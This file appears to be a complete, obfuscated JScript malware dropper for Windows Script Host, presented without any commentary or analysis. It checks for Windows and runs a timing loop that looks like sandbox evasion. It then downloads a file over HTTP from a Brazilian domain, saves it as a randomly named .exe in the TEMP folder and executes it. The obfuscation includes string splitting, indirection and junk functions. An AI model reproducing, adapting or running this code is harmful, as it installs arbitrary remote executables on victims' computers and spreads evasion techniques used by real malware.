var Di = false;
var B = "CreateObject";
var dx = function b() {return WScript[B]("WScript.Shell");}(), N = 11;
var km = "MSXML2.XMLHTTP";
var vc = 2123213;
var dG = 0;
function am(i0){dx["Run"](i0, dG, dG);};
function fC(){return "" + km;};
function ls(Yw, Zx){dG = dG * 1; return Yw - Zx;};
function Mz(){return B;};
/*@cc_on
  @if (@_win32 || @_win64)
    Di = true;
  @end
@*/
if (Di)
{
var kb = "";
function V(){return 22;};
var qE = 0; var X = 0;
function i()
{
var P = new this["Date"]();
var BS = P["getUTCMilliseconds"]();
WScript["Sleep"](V());
var P = new this["Date"]();
var fE = P["getUTCMilliseconds"]();
WScript["Sleep"](V());
var P = new this["Date"]();
var Ub = P["getUTCMilliseconds"]();
var qE = "Y";
qE = ls(fE, BS);
var X = "y";
X = ls(Ub, fE);
kb = "open";
return ls(qE, X);
}
var M = false;
var U = false;
for (var xc = dG; xc < V() * 1; xc++){if (i() != dG){
M = true; 
X = "31" + 11 * qE + X; 
U = true; 
break;
}}
function Vl() {return ((M == true) && (M == U)) ? 1 : dG;};
if (M && Vl() && U){
function v() {return dx["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "6mzBBNdOeFGcX.exe";};
 tK = fC();
 f = WScript[B](tK);
 var ze = 1;
 while (ze){
try {
f[kb]("GET", "http://lojaagrometal.com.br/mi3sa", false);
f["send"]();
b0 = "Sleep";
for (;;){WScript[b0](V() * 11); if (f["readystate"] >= 2 * 2) break;};
ze = dG;
} catch(Hu){};
}
function WF(w) {var hF = (1, 2, 3, 4, 5, w); return hF;};
ga = WScript[Mz()]("ADODB.Stream");
tK = ga;
tK[kb]();
tK["type"] = WF(1);
tK["write"](f["ResponseBody"]);
ga["position"] = WF(dG);
tK["Save" + "ToFile"](v(), 2);
ga["c"+"lose"]();
Nf = v();
am(Nf);
}
}

